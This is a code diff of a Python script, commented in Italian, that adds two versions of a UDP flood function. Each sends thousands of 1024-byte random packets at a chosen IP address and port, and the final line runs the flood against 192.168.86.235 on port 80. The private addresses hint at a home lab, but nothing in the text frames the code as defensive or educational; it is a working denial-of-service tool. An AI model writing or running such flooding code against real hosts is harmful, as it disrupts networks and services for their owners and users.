@@ -38,4 +38,38 @@ def udp_flood_v1(indirizzo_ip, numero_porta, numero_pacchetti):
         my_socket.close()
 
 
-udp_flood_v1("192.168.86.32", 5555, 50000)
+
+def udp_flood_v2(indirizzo_ip, numero_porta, numero_pacchetti):
+    """ Creazione di un udp flood """
+    data_to_send = random._urandom(1024)
+    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as my_socket:
+        target = ((indirizzo_ip, numero_porta))
+        my_socket.connect(target)
+        print(f"Il target selezionato è: {target}")
+        for x in range(0, numero_pacchetti):
+            my_socket.sendto(data_to_send, target)
+            print(f"N:{x} - UDP inviati")
+
+
+def udp_flood_v3(indirizzo_ip, numero_porta, numero_pacchetti):
+    """ Creazione di un udp flood """
+    data_to_send = random._urandom(1024)
+    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as my_socket:
+        try:
+            target = ((indirizzo_ip, numero_porta))
+            my_socket.connect(target)
+        except OSError:
+            print("OS Error.")
+        else:
+            print(f"Il target selezionato è: {target}")
+            for x in range(0, numero_pacchetti):
+                try:
+                    my_socket.sendto(data_to_send, target)
+                except ConnectionRefusedError:
+                    print("Connessione Rifiutata.")
+                else:
+                    print(f"N:{x} - UDP inviati")
+
+
+#udp_flood_v1("192.168.86.32", 5555, 50000)
+udp_flood_v3("192.168.86.235", 80, 50000)
